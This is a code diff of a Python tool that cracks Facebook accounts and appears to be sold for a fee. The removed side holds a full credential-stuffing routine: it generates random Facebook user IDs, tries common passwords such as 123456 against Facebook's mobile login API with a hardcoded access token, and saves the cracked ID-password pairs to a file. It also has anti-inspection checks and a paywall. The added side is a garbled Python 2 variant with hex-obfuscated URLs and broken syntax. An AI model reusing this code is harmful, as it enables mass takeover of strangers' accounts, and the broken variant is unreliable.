@@ -1,551 +1,404 @@
-import os
-import time
-import uuid
-import hashlib
-import random
-import string
-import requests
-import sys
-import json
-import urllib
-from bs4 import BeautifulSoup
-from random import randint as rr
-from concurrent.futures import ThreadPoolExecutor as tred
+#!/usr/bin/python2
+# -*- coding: utf-8
+
+#AUTHOR : ARSALAN
+#OPEN SOURCE :)
+#NOT MY OWN SCRIPT BROH:)
+
+
+try:
+	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
+	from multiprocessing.pool import ThreadPool
+	from requests.exceptions import ConnectionError
+except ImportError:
+	os.system("pip2 install requests lolcat")
+	os.system("python2 fcpro.py")
+
 from os import system
-from datetime import datetime
+from time import sleep
 
-# Ensure required modules are installed
-modules = ['requests', 'urllib3', 'mechanize', 'rich']
-for module in modules:
-    try:
-        __import__(module)
-    except ImportError:
-        os.system(f'pip install {module}')
-
-# Suppress InsecureRequestWarning
-from requests.exceptions import ConnectionError
-from requests import api, models, sessions
-requests.urllib3.disable_warnings()
-
-
-# Initial setup and promotion
-os.system('clear')
-print(' \x1b[38;5;46mARSA SERVER LOADING....')
-
-
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
-print('loading Modules ...\n')
-os.system('clear')
-# --- GITHUB APPROVAL SYSTEM ---
-def arsa_approval():
-    os.system('clear')
-    # Aapka unique key identifier
-    uuid_raw = str(os.getlogin()) + str(os.getuid())
-    key = hashlib.md5(uuid_raw.encode()).hexdigest().upper()[:12]
-    
-    # Yahan apni GitHub link lagayein jahan approved keys hongi
-    # Format: Raw text file on GitHub
-    # https://github.com/khanisalma748-a11y/salmakhani.git
-    
-    print("\x1b[1;31m█████╗  ██████╗ ██╗  ██╗")
-print("\x1b[1;32m██╔══██╗██╔═████╗██║  ██║")
-print("\x1b[1;33m╚█████╔╝██║██╔██║███████║")
-print("\x1b[1;34m██╔══██╗████╔╝██║╚════██║")
-print("\x1b[1;35m╚█████╔╝╚██████╔╝     ██║")
-print("\x1b[1;36m ╚════╝  ╚═════╝      ╚═╝\x1b[0m")
-import os, hashlib
-uuid_raw = str(os.getlogin()) + str(os.getuid())
-key = hashlib.md5(uuid_raw.encode()).hexdigest().upper()[:12]
-print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-print(f"\x1b[1;37m YOUR KEY : \x1b[1;32mARSA-{key}")
-print("\033[1;36m💵 Available TOOL PRICES\033[0m")
-print("\033[1;31m" + "━" * 40 + "\033[0m")
-print("\033[1;32m[1] 5 Dollars 7 days \033[0m")
-print("\033[1;33m[2] 10 Dollars 15 days \033[0m")
-print("\033[1;34m[3] 18 Dollars 30 days \033[0m")
-print("\033[1;31m" + "━" * 40 + "\033[0m")
-print(" \x1b[1;37mStatus: \x1b[1;31mChecking Approval...")
-github_link="https://raw.githubusercontent.com/khanisalma748-a11y/salmakhani/main/salmakhni"
-try:
-    response = requests.get(github_link).text
-    if "ARSA_123" in response:
-        print("\x1b[32;41m\t Welcome ARSA TOOL 🔥 \x1b[0m.")
-        time.sleep(2)
-    else:
-        print("\x1b[1;31mKey Is Not Approved Please Contact The Admin .")
-        os.system(f'xdg-open https://wa.me/+923022745249?text=Mera-Key-Approve-Kardo-ARSA-{key}')
-        sys.exit()
-except:
-    sys.exit()
-
-# Initial setup and promotion
-arsa_approval() # Sabse pehle approval check hoga
-
-os.system('clear')
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
-print('loading Modules ...\n')
-os.system('clear')
-os.system('xdg-open https://chat.whatsapp.com/JX01XMReYrYBsQSrS1IL8N')
-
-
-
-# --- Anti-tampering and Security Checks ---
-# The script checks if the source code of the 'requests' library has been modified
-# or if packet sniffing tools are being used.
-try:
-    api_body = open(api.__file__, 'r').read()
-    models_body = open(models.__file__, 'r').read()
-    session_body = open(sessions.__file__, 'r').read()
-    word_list = ['print', 'lambda', 'zlib.decompress']
-    for word in word_list:
-        if word in api_body or word in models_body or word in session_body:
-            exit()
-except:
-    pass
-
-
-class sec:
-    """
-    A security class to detect debugging and packet sniffing tools.
-    """
-    def __init__(self):
-        self.__module__ = __name__
-        self.__qualname__ = 'sec'
-        # Paths to check for modifications
-        paths = [
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
-        ]
-        for path in paths:
-            if 'print' in open(path, 'r').read():
-                self.fuck()
-        # Check for HTTPCanary (a packet sniffing app)
-        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
-            self.fuck()
-        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
-            self.fuck()
-
-    def fuck(self):
-        """
-        Terminates the script if tampering is detected.
-        """
-        print(' \x1b[1;32m Congratulations ! ')
-        self.linex()
-        exit()
-
-    def linex(self):
-        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
-
-# Global variables
-method = []
-oks = []
-cps = []
-loop = 0
-user = []
-
-# Color codes for terminal output
-X = '\x1b[1;37m'
-rad = '\x1b[38;5;196m'
-G = '\x1b[38;5;46m'
-Y = '\x1b[38;5;220m'
-PP = '\x1b[38;5;203m'
-RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
-W = '\x1b[1;37m'
-
-import random
-
-def windows():
-    """
-    Generates a modern, randomized Windows User-Agent string (Variant A).
-    """
-    # Modernized older-style fallback but with updated Chrome builds
-    aV = random.choice(range(10, 20))
-    chrome_major_old = random.choice(range(100, 115))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
-    
-    # Mid-range modern User-Agent
-    bz = f"537.36"
-    chrome_major_mid = random.choice(range(115, 125))
-    B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
-    
-    # WOW64 (32-bit browser on 64-bit OS) variant
-    chrome_major_wow = random.choice(range(120, 130))
-    C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
-    
-    # Cutting-edge modern User-Agent (Chrome 130 - 142+)
-    chrome_latest = random.choice(range(130, 143))
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
-    
-    return random.choice([A, B, C, D])
-
-
-def window1():
-    """
-    Generates a highly updated, modern Windows User-Agent string (Variant B).
-    """
-    # Standard Modern Win 10/11 template
-    chrome_major = random.choice(range(120, 140))
-    build_1 = random.choice(range(6000, 7100))
-    A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
-    
-    # Alternative layout with specific patch versions
-    chrome_major_alt = random.choice(range(125, 142))
-    build_2 = random.choice(range(6200, 7150))
-    patch_2 = random.choice(range(50, 250))
-    B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
-    
-    # Compatibility style for enterprise networks
-    chrome_major_ent = random.choice(range(118, 135))
-    build_3 = random.choice(range(5800, 6800))
-    C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.{random.choice(range(10, 190))} Safari/537.36"
-    
-    # Ultra-latest builds (Chrome 140+)
-    latest_build = random.randint(7000, 7500)
-    latest_patch = random.randint(100, 300)
-    chrome_ultra = random.choice(range(140, 146))
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ultra}.0.{latest_build}.{latest_patch} Safari/537.36"
-    
-    return random.choice([A, B, C, D])
-
-
-
-# Set window title
-sys.stdout.write('\x1b]2;𓆩【A.R.S.A 👑 】𓆪 \x07')
-
-
-    # RAJA Clover Logo - Green - Version 2.5
-def ____banner____():
-    if 'win' in sys.platform:
-        os.system('cls')
-    else:
-        os.system('clear')
-    
-    print("""\033[1;32m
-==========================================        
-█████╗  ██████╗ ██╗  ██╗
-██╔══██╗██╔═████╗██║  ██║
-╚█████╔╝██║██╔██║███████║
-██╔══██╗████╔╝██║╚════██║
-╚█████╔╝╚██████╔╝     ██║
- ╚════╝  ╚═════╝      ╚═╝                        
-ₒWₙₑᵣ ₐᵣₛₐₗₙ Cₗₒₙₑᵣ ₈₀₄
-ₜₒₒₗₛ :ₒₗD ᵢD CₗₒₙᵢₙG 
-==========================================                            
-\033[0m""")
-
-
-def  creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
-    if len(uid) == 10:
-        if uid.startswith(('11529', '11503', '115')):
-            return '2008'
-            
-    if len(uid) == 15:
-        if uid.startswith('1000000000'):
-            return '2009'
-        elif uid.startswith(('1000001', '1000002', '1000003', '1000004', '1000005')):
-            return '2009'
-        elif uid.startswith(('1000006', '1000007', '1000008', '1000009')):
-            return '2010'
-        elif uid.startswith('100001'):
-            return '2010'
-        elif uid.startswith(('100002', '100003')):
-            return '2011'
-        elif uid.startswith('100004'):
-            return '2012'
-        elif uid.startswith(('100005', '100006')):
-            return '2013'
-        elif uid.startswith(('100007', '100008')):
-            return '2014'
-        elif uid.startswith('100009'):
-            return '2015'
-        elif uid.startswith('10001'):
-            return '2016'
-        elif uid.startswith('10002'):
-            return '2017'
-        elif uid.startswith('10003'):
-            return '2018'
-        elif uid.startswith('10004'):
-            return '2019'
-        elif uid.startswith('10005'):
-            return '2020'
-        elif uid.startswith('10006'):
-            return '2021'
-        elif uid.startswith(('10007', '10008')):
-            return '2022'
-        elif uid.startswith('10009'):
-            return '2023'
-            
-    return ''
-
-
-
-def clear():
-    os.system('clear')
-
-
-def linex():
-    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
-
-def BNG_71_():
-    """
-    Main menu function.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
-    linex()
-    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mCHOICE  {W}: {Y}")
-    if __Jihad__ in ('A', 'a', '01', '1'):
-        old_clone()
-    else:
-        print(f"\n    {rad}Choose Valid Option... ")
-        time.sleep(2)
-        BNG_71_()
-
-
-def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mALL SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m100003/4 SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m2009 series')
-    linex()
-    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mCHOICE  {W}: {Y}")
-    if _input in ('A', 'a', '01', '1'):
-        old_One()
-    elif _input in ('B', 'b', '02', '2'):
-        old_Tow()
-    elif _input in ('C', 'c', '03', '3'):
-        old_Tree()
-    else:
-        print(f"\n[×]{rad} Choose Value Option... ")
-        BNG_71_()
-
-
-def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    star = '10000'
-    for _ in range(int(limit)):
-        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
-        user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for mal in user:
-            uid = star + mal
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    prefixes = ['100003', '100004']
-    for _ in range(int(limit)):
-        prefix = random.choice(prefixes)
-        suffix = ''.join(random.choices('0123456789', k=9))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tree():
-    """
-    Cloning method for accounts from 2008-2010.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
-    linex()
-    prefix = '1152947'
-    for _ in range(int(limit)):
-        suffix = ''.join(random.choices('0123456789', k=3))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def login_1(uid):
-    """
-    Login attempt method 1.
-    """
-    global loop
-    session = requests.session()
-    try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
+def xox(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789'):
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
-            }
-            headers = {
-                'User-Agent': window1(),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
-            }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-            if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mARSA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ARSA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARSA-M1👿\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ARSA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
-        loop += 1
-    except Exception:
-        time.sleep(5)
+        time.sleep(0.04)
+      
 
+				
+user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])
 
-def login_2(uid):
-    """
-    Login attempt method 2.
-    """
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+
+try:
+	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
+	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
+except requests.exceptions.ConnectionError:
+	os.system("clear")
+	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
+	sys.exit()
+	
+ip = requests.get('https://api.ipify.org').text.strip()
+loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
+	
+def linex():
+	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
+def logo():
+	os.system('echo "\n\n \t╭━━━┳━╮╱╭┳━━━┳━━━┳╮╱╱╭┳╮╭╮\n \t┃╭━╮┃┃╰╮┃┃╭━╮┃╭━╮┃╰╮╭╯┃┃┃┃\n \t┃╰━━┫╰╮╰╯┃┃╱┃┃╰━━┫╰╮╰╯┃┃┃┃\n \t╰━━╮┃╭╮╰╮┃┃╱┃┣━━╮┃╭╮╰╮┃╰╯╯\n \t┃╰━╯┃┃╱╰╮┃╰━╯┃╰━╯┃┃╱╰╮┃╭╮╮\n \t╰━━━┻╯╱<span>╰━┻━━━┻━━━┻╯╱╰━┻╯╰╯" | lolcat -a -d 2 -s 50')	
+
+def main():
+	os.system("clear")
+	print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("\n\t\033[93;1m      ARSLAN MAIN MENU\x1b[0m\n")
+    print("\033[92;1m
+	print("\033[92;1m     ARSALAN  [Ars] 1] START CRACK")
+	print("\033[93;1m              [Ars] 2] HOW TO GET ACCESS TOKEN")
+	print("\033[94;1m              [Ars] 3] UPDATE TOOL")
+	print("\033[90;1m     jhkas    [Ars] 0] EXIT")
+	print("")
+	log_sel()
+	
+def log_sel():
+	sel = raw_input("\033[93;1m      CHOOSE: \033[92;1m")
+	if sel == "":
+		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
+		log_sel()
+	elif sel =="1" or sel =="01":
+		token()
+	elif sel =="2" or sel =="02":
+		subprocess.check_output(["am", "start", "https://m.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340"])
+		main()
+	elif sel =="3" or sel =="03":
+		import os
+		try:
+			os.system("https://github.com/khanisalma748-a11y/salmakhani.git")
+			os.system("rm -rf ARSALAN.py")
+			os.system("cp -f arsalan/arsalan.py \\.")
+			os.system("rm -rf ARSLAN")
+			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
+			time.sleep(2)
+			main()
+		except KeyboardInterrupt:
+			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
+	        	main()
+	elif sel =="0" or sel =="00":
+		xox("\n\t\033[91;1m THANKS FOR USING MY TOOL :)")
+		sys.exit()
+	else:
+		print("")
+		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("")
+		log_sel()
+
+def token():
+    os.system("clear")
+    try:
